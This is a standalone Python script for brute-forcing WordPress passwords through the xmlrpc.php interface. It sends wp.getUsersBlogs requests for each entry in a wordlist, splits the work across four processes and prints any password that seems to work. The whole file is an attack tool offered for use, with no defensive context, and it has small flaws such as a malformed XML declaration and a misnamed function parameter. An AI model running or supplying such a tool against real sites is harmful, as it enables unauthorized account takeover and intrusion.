#!/usr/bin/env python3


import requests
import sys
import os
import multiprocessing as mp
from time import sleep


def brute(url,username,filename):

		if url[-1] == "/":
			url=url[0:-1]
		url = url + "/xmlrpc.php"

		for password in wordlist:

			xml=f"""<?xml version"1.0" ?>
			<methodCall>
			<methodName>wp.getUsersBlogs</methodName>
			<params>
				<param>
					<value><string>{username}</string></value>
				</param>
				<param>
					<value><string>{password}</string></value>
				</param>
			</params>
			</methodCall>
		"""
			headers = {'Content-Type': 'application/x-www-form-urlencoded'}
			r = requests.post(url,headers=headers, data=xml)
			text = r.text
			if "Incorrect username or password." not in text and "parse error. not well formed" not in text:
				print(f"[+] PASSWORD FOUND ====> {password} ")
				os._exit(0)


if __name__ == "__main__":


    print("#### XMLRPC PASSWORD BRUTE FORCE ####")
    if(len(sys.argv) < 4):
        print(f"Usage : python {sys.argv[0]} <URL> <USERNAME> <WORDLIST>")
        exit(0)
    _,url,username,wordlist = sys.argv
    sub_list = open(sys.argv[3], encoding='ISO-8859-1').read()
    passwords = sub_list.splitlines()
    wordlist_len = len(passwords)
    nb_threads = 4
    step = wordlist_len//nb_threads + 1
    threads = list()
    for index in range(nb_threads):
	    wordlist = passwords[index*step:(index+1)*step]
	    p = mp.Process(target=brute,args=(url,username,wordlist,))
	    threads.append(p)
	    p.start()
    for index, p in enumerate(threads):
	    p.join()


